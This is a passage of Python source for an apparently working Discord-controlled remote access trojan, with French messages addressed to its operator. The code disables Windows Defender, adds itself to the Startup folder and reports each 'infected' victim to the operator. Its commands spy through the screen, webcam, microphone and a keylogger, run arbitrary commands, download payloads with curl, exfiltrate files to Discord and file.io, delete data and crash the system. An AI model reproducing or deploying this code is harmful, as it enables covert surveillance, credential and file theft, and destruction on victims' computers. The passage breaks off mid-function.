
    os.system("powershell Set-MpPreference -DisableRealtimeMonitoring $true")

    if os.path.exists(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{os.path.basename(sys.executable)}"):    
        os.system(fr'''Add-MpPreference -ExclusionPath "C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{os.path.basename(sys.executable)}"''')
        
    on_ready_embed = discord.Embed(
        title="Un appareil a été infecté !",
        description=f"Nom de l'appareil : `{user}`",
        color=discord.Color.blue()
    )
    on_ready_embed.set_thumbnail(
        url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
    )
    on_ready_embed.set_footer(text=f"Appareil surveillé : {user}") 
    channel = BOT.get_channel(channel_id)
    await channel.send("@everyone", embed=on_ready_embed)

    startup_path = fr'C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    command = '''powershell -Command "Add-MpPreference -ExclusionPath \''" '''

    script_path = sys.executable


    try:
        shutil.copy(script_path, startup_path)
        succes_added_to_sartup_embed = discord.Embed(
            title=f"Le programme a réussi à s'installer dans le dossier de démarrage.",
            description=f"Une copie du programme infécté est maintenant présente dans le dossier de démarage Windows de l'appareil de la victime.\n**Chemin du fichier d'origine :** ` {script_path} `\n**Chemin de la copie du programme infécté : ` {startup_path} `",
            color=discord.Color.green()
        )
 
        await channel.send(embed=succes_added_to_sartup_embed)

    except Exception as e:
        failed_to_add_to_sartup_embed = discord.Embed(
            title=f"ATTENTION : Le programme n'a pas réussi à s'installer dans le dossier de démarrage.",
            description=f" le dossier de démarage Windows de l'appareil de la victime.\n**Chemin du fichier d'origine :** ` {script_path} `",
            color=discord.Color.red()
        )

        await channel.send(embed=failed_to_add_to_sartup_embed)

@BOT.command()
async def help(ctx):
    user = os.getlogin()
    help_message = """
**📜 Liste des commandes disponibles :**

🖥️ **Informations Système**
- `recovery` : Récupère les informations système via un webhook ou un bot Telegram.
- `ip` : Affiche l'adresse IP de l'utilisateur.
- `system` : Affiche les informations du système.
- `tasklist` : Affiche la liste des processus en cours.
- `filepath` : Affiche le chemin du fichier infecté et s'il est présent dans le dossier de démarrage.

🎥 **Capture et Enregistrement**
- `screen` : Prend une capture d'écran.
- `webcam` : Prend une photo depuis la webcam.
- `micrecord <temps>` : Enregistre le son du micro pendant la durée spécifiée.

🔔 **Notifications et Messages**
- `notify <titre> | <message>` : Affiche une notification sur l'écran de l'utilisateur.
- `error <titre> | <message>` : Affiche une fausse erreur.
- `warning <titre> | <message>` : Affiche un faux avertissement.
- `msgbox <titre> | <message>` : Affiche un message d'information.
- `type <texte>` : Simule la frappe du texte fourni.

📂 **Gestion des Fichiers**
- `download <chemin>` : Télécharge un fichier depuis la machine cible.
- `upload <chemin>` : Envoie un fichier à la machine cible.
- `delete <chemin>` : Supprime un fichier spécifique.
- `duplicate <chemin>` : Duplique un fichier à un autre emplacement.

⌨️ **Surveillance**
- `keylogger <nombre>` : Enregistre un certain nombre de frappes clavier.
- `stealpass` : Récupère les mots de passe enregistrés.
- `tokens` : Récupère les tokens Discord enregistrés.

🖥️ **Contrôle du Système**
- `exe <commande>` : Exécute une commande sur la machine cible.
- `exeout <commande>` : Exécute une commande et affiche la sortie.
- `shutdown` : Éteint la machine cible.
- `restart` : Redémarre la machine cible.
- `bsod` : Provoque un écran bleu.
- `stop` : Arrête le bot.

🌐 **Navigation et Réseaux**
- `edgepage <site>` : Ouvre un site web sur Microsoft Edge.
    """

    help_embed = discord.Embed(
        title="📌 Liste des commandes du bot :",
        description=help_message,
        color=discord.Color.blue()
    )

    help_embed.set_thumbnail(
        url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
    )
    help_embed.set_footer(
        text=f"Appareil surveillé : {user}"
    )

    await ctx.send(embed=help_embed)


@BOT.command()
async def ip(ctx):
    user = os.getlogin()

    try:
        hostname = socket.gethostname()
        pc_ip = socket.gethostbyname(hostname)
        ip_embed = discord.Embed(
            title="Victim's IP found !",
            description=f"\nVictim's IP : {pc_ip}",
            color=discord.Color.blue()
        )
        ip_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
        ip_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=ip_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title=":x: Erreur lors de la récuparation de l'IP",
            description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur: `  {e}  `",
            color=discord.Color.red()
        )
        error_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)
@BOT.command()  
async def screen(ctx):
    user = os.getlogin()
    screen_screenshot_id = ''.join(random.choices("0123456789", k=4))
    screen_screenshot = pyautogui.screenshot()
    screen_screenshot.save(f"screenshot_{screen_screenshot_id}.png")
    try:
        with open(f"screenshot_{screen_screenshot_id}.png", "rb") as screen:
            screen_file = discord.File(f"screenshot_{screen_screenshot_id}.png", filename=f"screenshot_{screen_screenshot_id}.png")
            screengrabb_embed = discord.Embed(
                title="Screen grabbed !",
                description=f"\nL'écran de l'appareil {user} à été capturée !",
                color=discord.Color.blue()
            )
            screengrabb_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
            screengrabb_embed.set_footer(text=f"Appareil surveillé : {user}")

            await ctx.send(embed=screengrabb_embed)
            await ctx.send(file=screen_file)
    except Exception as e:
        error_embed = discord.Embed(
            title=":x: Erreur lors de la capture de l'écran",
            description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
            color=discord.Color.red()
        )
        error_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)
    finally:
        os.remove(f"screenshot_{screen_screenshot_id}.png")

@BOT.command()
async def webcam(ctx):
    user = os.getlogin()
    webcam_capture = cv2.VideoCapture(0)
    ret, frame = webcam_capture.read()
    webcam_capture.release()  
    cv2.destroyAllWindows()

    if not ret:
        await ctx.send(f"❌ Impossible de capturer la webcam de {user}")
        return

    webcam_screenshot_id = ''.join(random.choices("0123456789", k=4))
    filename = f"webcam_{webcam_screenshot_id}.png"

    cv2.imwrite(filename, frame)

    try:
        webcam_file = discord.File(filename, filename=filename)
        webcamgrabb_embed = discord.Embed(
            title="Webcam Grabbed !",
            description=f"\nLa webcam de l'appareil {user} a été capturée !",
            color=discord.Color.blue()
        )
        webcamgrabb_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
        webcamgrabb_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=webcamgrabb_embed)
        await ctx.send(file=webcam_file)

    except Exception as e:
        await ctx.send(f"❌ Erreur : {e}")

    finally:
        os.remove(filename) 


@BOT.command()
async def system(ctx):
    try:
        try:
            hostname = socket.gethostname()
        except:
            pass
        try:
            pc_ip = socket.gethostbyname(hostname)
        except:
            pc_ip = "Une erreur est survenue lors de la récupération"
        try:
            pc_name = os.getlogin()
        except:
            pc_name = "Une erreur est survenue lors de la récupération"
        try:
            pc_gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        except:
            pc_gpu = "Une erreur est survenue lors de la récupération"
        try:
            pc_cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        except:
            pc_cpu = "Une erreur est survenue lors de la récupération"
        try:
            pc_ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
        except:
            pc_ram = "Une erreur est survenue lors de la récupération"
        try:
            mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
        except:
            mac_address = "Une erreur est survenue lors de la récupération"
        try:
            pc_uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        except:
            pc_uuid = "Une erreur est survenue lors de la récupération"

        system_embed = discord.Embed(
            title="Victim's system infos",
            description=f"IP : ` {pc_ip} `\nUser : ` {pc_name} `\nGPU : ` {pc_gpu} `\nCPU : ` {pc_cpu} `\nRAM : ` {pc_ram} `\nAdresse MAC : ` {mac_address} `\nUUID : ` {pc_uuid} `\n",
            color=discord.Color.blue()
        )

        system_embed.set_thumbnail(
                    url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
                )
        system_embed.set_footer(text=f"Appareil surveillé : {pc_name}")

        await ctx.send(embed=system_embed)
    except Exception as e:

        error_embed = discord.Embed(
                title=":x: Erreur lors de la récupération des informations système",
                description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {pc_name}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def restart(ctx):
    user = os.getlogin()

    try:
        os.system("shutdown /r /t 0")
        successfully_restarted_embed = discord.Embed(
            title="Appareil redemarré",
            description=f"L'appareil ` {user} ` a bien été redémarré",
            color=discord.Color.green()
        )

        await ctx.send(embed=successfully_restarted_embed)
    except Exception as e:
        error_embed = discord.Embed(
            title=":x: Une erreur est survenue",
            description=f"Une erreur est survenue lors de l'execution de la commande.\n\n**Détails :** {e}",
            color=discord.Color.red()
        )
        await ctx.send(embed=error_embed)

@BOT.command()
async def filepath(ctx):
    user = os.getlogin()
    path = sys.executable
    startup = "Non"
    startup_path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{os.path.basename(sys.executable)}"
    if os.path.exists(startup_path):
        startup = "Oui"

    path_embed = discord.Embed(
        title="Chemin du fichier infecté",
        description=f"**Chemin du fichier actuellement en cours d'utilisation :** {path}\n\n**Présent dans le dossier de démarrage :** {startup}",
        color=discord.Color.blue()
    )

    await ctx.send(embed=path_embed)

@BOT.command()
async def notify(ctx, *, content: str = None):

    user = os.getlogin()

    if not content or "|" not in content:
        error_say_embed = discord.Embed(
        	title=":x: Mauvaise syntaxe de commande !",
            description='''Format incorrect ! Utilisez : `+notification \"Titre | Message\"`''',
            color=discord.Color.red()
        )
        await ctx.message.delete()
        await ctx.send(embed=error_say_embed)
        return
    try:

        notification_title, notification_message = map(str.strip, content.split("|", 1))

        notif = Notification(app_id="K4L4SHNIK0V RAT", title=notification_title, msg=notification_message)
        notif.show()

        send_valid_embed = discord.Embed(
            title=f"La notification a bien été envoyée à l'appareil ` {user} `",
            description=f"Title : ` {notification_title} `\nNotification message : ` {notification_message} `",
            color=discord.Color.green()
        )

        send_valid_embed.set_thumbnail(
                    url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
                )
        send_valid_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=send_valid_embed)
    except Exception as e:

        error_embed = discord.Embed(
                title=":x: Erreur lors de l'envoie de la notification",
                description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def error(ctx, *, content: str=None):

    user = os.getlogin()

    if not content or "|" not in content:
        error_say_embed = discord.Embed(
        	title=":x: Mauvaise syntaxe de commande !",
            description='''Format incorrect ! Utilisez : `+error \"Titre | Message\"`''',
            color=discord.Color.red()
        )
        await ctx.message.delete()
        await ctx.send(embed=error_say_embed)
        return

    try:

        error_title, error_message = map(str.strip, content.split("|", 1))

        messagebox.showerror(title=error_title, message=error_message)

        send_valid_embed = discord.Embed(
            title=f"L'erreur a bien été envoyée à l'appareil ` {user} `",
            description=f"Title : ` {error_title} `\nNotification message : ` {error_message} `",
            color=discord.Color.green()
        )

        send_valid_embed.set_thumbnail(
                    url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
                )
        send_valid_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=send_valid_embed)
    except Exception as e:

        error_embed = discord.Embed(
                title=":x: Erreur lors de l'affichage de l'erreur",
                description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def msgbox(ctx, *, content: str=None):

    user = os.getlogin()

    if not content or "|" not in content:
        error_say_embed = discord.Embed(
        	title=":x: Mauvaise syntaxe de commande !",
            description='''Format incorrect ! Utilisez : `+error \"Titre | Message\"`''',
            color=discord.Color.red()
        )
        await ctx.message.delete()
        await ctx.send(embed=error_say_embed)
        return

    try:

        error_title, error_message = map(str.strip, content.split("|", 1))

        messagebox.showinfo(title=error_title, message=error_message)

        send_valid_embed = discord.Embed(
            title=f"L'erreur a bien été envoyée à l'appareil ` {user} `",
            description=f"Title : ` {error_title} `\nNotification message : ` {error_message} `",
            color=discord.Color.green()
        )

        send_valid_embed.set_thumbnail(
                    url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
                )
        send_valid_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=send_valid_embed)
    except Exception as e:

        error_embed = discord.Embed(
                title=":x: Erreur lors de l'affichage de l'erreur",
                description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def warning(ctx, *, content: str=None):

    user = os.getlogin()

    if not content or "|" not in content:
        error_say_embed = discord.Embed(
        	title=":x: Mauvaise syntaxe de commande !",
            description='''Format incorrect ! Utilisez : `+error \"Titre | Message\"`''',
            color=discord.Color.red()
        )
        await ctx.message.delete()
        await ctx.send(embed=error_say_embed)
        return

    try:

        error_title, error_message = map(str.strip, content.split("|", 1))

        messagebox.showwarning(title=error_title, message=error_message)

        send_valid_embed = discord.Embed(
            title=f"L'erreur a bien été envoyée à l'appareil ` {user} `",
            description=f"Title : ` {error_title} `\nNotification message : ` {error_message} `",
            color=discord.Color.green()
        )

        send_valid_embed.set_thumbnail(
                    url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
                )
        send_valid_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=send_valid_embed)
    except Exception as e:

        error_embed = discord.Embed(
                title=":x: Erreur lors de l'affichage de l'erreur",
                description=f"une erreur est survenue, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def download(ctx, *, content: str=None):
    user = os.getlogin()

    if not content or "|" not in content:
        error_say_embed = discord.Embed(
        	title=":x: Mauvaise syntaxe de commande !",
            description='''Format incorrect ! Utilisez : `+download \"[url de téléchargement] | [nom + extension du fichier]\"` \n**Exemple de commande :** +download http://lien-du-fichier.com/download/exemple | Exemple.py''',
            color=discord.Color.red()
        )
        await ctx.message.delete()
        await ctx.send(embed=error_say_embed)
        return

    try:

        file_name, url = map(str.strip, content.split("|", 1))

        os.system(f'''curl -o {file_name} {url}''')

        repertoire = os.getcwd()
        path_file = os.path.join(repertoire, file_name)

        download_success_embed = discord.Embed(
            title=f"Téléchargement réussi !",
            description=f"Chemin d'accès du fichier : ` {path_file} `",
            color=discord.Color.green()
        )
        download_success_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
        download_success_embed.set_footer(
            text=f"Appareil surveillé : {user}"
        )

        await ctx.send(embed=download_success_embed)
    except Exception as e:

        error_embed = discord.Embed(
                title=":x: Erreur lors du téléchargement du fichier",
                description=f"**Conseil :** Vérifiez l'url cible et l'extension du fichier.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def exe(ctx, *, command: str=None):
    user = os.getlogin()

    try:
        os.system(f'''{command}''')
        success_execution_embed = discord.Embed(
            title=f"La commande à été executée sur l'appareil ` {user} `",
            description=f"Commande : ` {command} `",
            color=discord.Color.green()
        )
        success_execution_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
        success_execution_embed.set_footer(
            text=f"Appareil surveillé : {user}"
        )

        await ctx.send(embed=success_execution_embed)
    except Exception as e:
        error_embed = discord.Embed(
                title=f":x: Erreur lors de l'execution de la commande sur l'appareil ` {user} `",
                description=f"une erreur est survenue lors de l'execution de la commande, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def keylogger(ctx, *, keystrokes_number: int):
    user = os.getlogin()

    try:
        with open("keylogger_file.txt", "w") as file:
            file.write("<===========[ KEYLOGGER LOGS ]===========> \n \n")

        timer = 0

        while True:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                timer += 1
                pressed_key = event.name
                with open("keylogger_file.txt", "a") as file:
                    file.write(pressed_key)
                
                    if timer == keystrokes_number:
                        timer = 0
            
                        with open("keylogger_file.txt", "r") as file:
                            logs = file.read()
                            keylogs_embed = discord.Embed(
                                title=f"Logs de frappes de l'appareil ` {user} `",
                                description=logs,
                                color=discord.Color.blue()
                            )
                        await ctx.send(embed=keylogs_embed)
                        with open("keylogger_file.txt", "w"):
                            pass 
                        break
    except Exception as e:
        error_embed = discord.Embed(
                title=f":x: Erreur lors du lanceent du keylogger sur l'appareil ` {user} `",
                description=f"une erreur est survenue lors de l'execution du keylogger ou de l'envoi des frappes, veuillez réessayer plus tard.\n**Conseil :** Vérifiez que le nombre de frappes entrées dans votre commande est bien un nombre entier.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def shutdown(ctx):
    user = os.getlogin()

    try:
        os.system('''shutdown /s /t 0''')

        succes_turn_off_embed = discord.Embed(
            title=f"L'appareil ` {user} ` à été éteint",
            color=discord.Color.green()
        )
        succes_turn_off_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        succes_turn_off_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=succes_turn_off_embed)

    except Exception as e:
        error_embed = discord.Embed(
                title=f":x: Erreur lors de l'extinction de l'appareil ` {user} `",
                description=f"une erreur est survenue lors de l'execution du keylogger ou de l'envoi des frappes, veuillez réessayer plus tard.\n\nErreur : ` `  {e}  ` `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def type(ctx, *, text: str):
    user = os.getlogin()

    try:
        pyautogui.write(text)
        success_type_embed = discord.Embed(
            title=f"Le clavier de l'appareil ` {user} ` a tapé {text}",
            description=f"Le texte ` {text} ` a bien été tapé via le clavier de l'appareil ` {user} `",
            color=discord.Color.green()
        )
        success_type_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        success_type_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=success_type_embed)
        
    except Exception as e:
        error_embed = discord.Embed(
                title=f":x: Erreur lors de l'écriture de ` {text} ` via le clavier de l'appareil ` {user} `",
                description=f"une erreur est survenue lors de l'execution des frappes, veuillez réessayer plus tard.\n\nErreur : `  {e}  `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def stop(ctx):

    stop_embed = discord.Embed(
        title="Arrêt du BOT...",
        color=discord.Color.blue()
    )

    await ctx.send(embed=stop_embed)

    os._exit(0)


@BOT.command()
async def micrecord(ctx, time: int):
    user = os.getlogin()
    recording_embed = discord.Embed(
        title="Lancement de l'écoute...",
        color=discord.Color.blue()
    )
    recording_embed.set_thumbnail(
        url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
    )
    recording_embed.set_footer(text=f"Appareil surveillé : {user}")
    await ctx.send(embed=recording_embed)

    try:
        RATE = 44100
        CHANNELS = 1
        duration = time
        audio_data = sd.rec(int(duration * RATE), samplerate=RATE, channels=CHANNELS, dtype='int16')
        sd.wait()
        file_id = ''.join(random.choices("0123456789", k=4))
        filename = f"record_{file_id}.wav"

        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(2)
            wf.setframerate(RATE)
            wf.writeframes(audio_data.tobytes())

        with open(filename, "rb") as record_file:
            recorded_file = discord.File(record_file, filename=filename)
            recording_embed = discord.Embed(
                title=f"Fin de l'écoute de l'appareil {user}",
                color=discord.Color.blue()
            )
            recording_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
            recording_embed.set_footer(text=f"Appareil surveillé : {user}")
            await ctx.send(embed=recording_embed, file=recorded_file)

    except Exception as e:
        error_embed = discord.Embed(
            title=f":x: Erreur lors de l'enregistrement du micro de l'appareil `{user}`",
            description=f"Une erreur est survenue lors de l'enregistrement.\n\nErreur : `  {e}  `",
            color=discord.Color.red()
        )
        error_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")
        await ctx.send(embed=error_embed)

@BOT.command()
async def upload(ctx, path=None):
    user = os.getlogin()

    try: 
        with open(path, "rb") as file:
            file_size = os.path.getsize(path)

            if file_size / (1024*1024) > 8:
                too_big_file_embed = discord.Embed(
                    title="Upload sur file.io ...",
                    description=f"Etant donné que la taille du fichier que vous souhaitez récupérer est supérieure ou égale à 8 Mo nous l'uploadons sur file.io. \n\n__**Veuillez patienter**__\n\n**Taille du fichier : {file_size / (1024 * 1024)} Mo",
                    color=discord.Color.blue()
                )
                await ctx.send(embed=too_big_file_embed)

                try:
                    response = requests.post('https://file.io', files={'file': file})
                except Exception as e:
                    error_embed = discord.Embed(
                        title=f":x: Erreur lors de l'upload du fichier sur file.io ` {path} `",
                        description=f"Une erreur est survenue lors de l'upload'.\n**Conseil :** Vérifiez que l'adresse fournie est bien valide et que la victime à une connexion inernet activée.\n\nErreur : `  {e}  `",
                        color=discord.Color.red()
                    )

                    error_embed.set_thumbnail(
                        url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
                    )

                    error_embed.set_footer(text=f"Appareil surveillé : {user}")

                    await ctx.send(embed=error_embed)
                    return
                data = response.json()
                upload_success_embed = discord.Embed(
                    title="Fichier uploadé !",
                    description=f"**[Clique ici]({data.get('link', 'Unavailable link')})** pour télécharger le fichier.",
                    color=discord.Color.blue()
                )
                await ctx.send(embed=upload_success_embed)
                return 
            
            stolen_file = discord.File(file, filename=path.split("\\")[-1])
            upload_success_embed = discord.Embed(
                title=f"Le fichier situé à l'adresse ` {path} ` à été récupéré",
                color=discord.Color.blue()
            )
            upload_success_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
            upload_success_embed.set_footer(text=f"Appareil surveillé : {user}")

            await ctx.send(embed=upload_success_embed, file=stolen_file)

    except Exception as e:
            error_embed = discord.Embed(
                title=f":x: Erreur lors de la récuperation du fichier situé à l'adresse ` {path} `",
                description=f"Une erreur est survenue lors de la récupération.\n**Conseil :** Vérifiez que l'adresse fournie est bien valide\n\nErreur : `  {e}  `",
                color=discord.Color.red()
            )
            error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
            error_embed.set_footer(text=f"Appareil surveillé : {user}")

            await ctx.send(embed=error_embed)

@BOT.command()
async def delete(ctx, *, path):
    user = os.getlogin()
    try:
        if os.path.isfile(path):
            os.chmod(path, stat.S_IWRITE)
            os.remove(path)
        elif os.path.isdir(path):
            shutil.rmtree(path)

        delete_success_embed = discord.Embed(
            title=f"Supression du pc ` {user} ` effectuée",
            description=f"La supression de l'élément situé à l'adresse {path} a bien été effectuée",
            color=discord.Color.green()
        )
        delete_success_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        delete_success_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=delete_success_embed)

    except Exception as e:
        error_embed = discord.Embed(
                title=f":x: Erreur lors de la supression de l'élément situé à l'adresse ` {path} `",
                description=f"Une erreur est survenue lors de la supression.\n**Conseil :** Vérifiez que l'adresse fournie est bien valide\n\nErreur : `  {e}  `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def duplicate(ctx, *, duplicate_path=None):
    user = os.getlogin()
    if duplicate_path is None:
        await ctx.send("Veuillez fournir un chemin pour la duplication.")
        return

    try:
        if hasattr(sys, 'frozen'):
            script_path = sys.executable 
        else:
            script_path = __file__ 

        shutil.copy(script_path, duplicate_path) 

        success_duplication_embed = discord.Embed(
            title=f"Le fichier a bien été dupliqué vers le chemin `{duplicate_path}`",
            description=f"La duplication vers le chemin `{duplicate_path}` a réussi.\n\n"
                        f"**Chemin du fichier origine :** {script_path}\n**Chemin du fichier dupliqué :** {duplicate_path}",
            color=discord.Color.green()
        )
        success_duplication_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
        success_duplication_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=success_duplication_embed)

    except Exception as e:
        error_embed = discord.Embed(
            title=f":x: Erreur lors de la duplication du fichier vers le chemin `{duplicate_path}`",
            description=f"Une erreur est survenue lors de la duplication.\n**Conseil :** Vérifiez que l'adresse fournie est bien valide\n\nErreur : ` {e} `",
            color=discord.Color.red()
        )
        error_embed.set_thumbnail(
            url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
        )
        error_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=error_embed)

@BOT.command()
async def bsod(ctx):
    user = os.getlogin()

    try:
        os.system('TASKKILL /F /IM svchost.exe') 

        success_bsod_embed = discord.Embed(
            title=f"BSOD généré sur l'appareil ` {user} `",
            description=f"Processus critique : ` svchost.exe `",
            color=discord.Color.green()
        )
        success_bsod_embed.set_thumbnail(
                url="https://img.freepik.com/free-vector/ak-47-gun-logo-design_373096-145.jpg?size=338&ext=jpg"
            )
        success_bsod_embed.set_footer(text=f"Appareil surveillé : {user}")

        await ctx.send(embed=success_bsod_embed)

    except Exception as e:
        error_embed = discord.Embed(
                title=f":x: Erreur lors de la génération du BSOD sur l'appareil ` {user} `",
                description=f"Une erreur est survenue lors de la génération du BSOD\n\nErreur : `  {e}  `",
                color=discord.Color.red()
            )
        error_embed.set_thumbnail(
